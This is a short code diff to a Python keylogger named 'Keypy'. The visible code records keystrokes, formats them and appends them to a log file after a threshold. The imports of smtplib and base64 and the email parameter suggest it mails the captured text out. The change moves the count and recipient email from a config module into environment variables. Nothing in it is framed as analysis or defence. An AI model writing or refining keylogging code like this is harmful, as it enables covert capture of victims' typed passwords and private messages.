@@ -18,7 +18,6 @@ import sys
 import argparse
 import os
 import pyautogui
-from config import count, email
 import smtplib
 import base64
 
@@ -48,7 +47,7 @@ class Keypy:
             .replace("Key.enter", "[ENTER]")
             .replace("Key.backspace", "[BACKSPACE]")
         )
-        if len(self.t) >= self.count:
+        if len(self.t) >= int(self.count):
             f = open("Logfile.txt", "a")
             f.write(self.t.replace("'", ""))
             f.close()
@@ -59,7 +58,7 @@ class Keypy:
 
 if __name__ == "__main__":
 
-    keypy = Keypy(count, email)
+    keypy = Keypy(os.getenv("COUNT"), os.getenv("EMAIL"))
 
     try:
         f = open("Logfile.txt", "a")
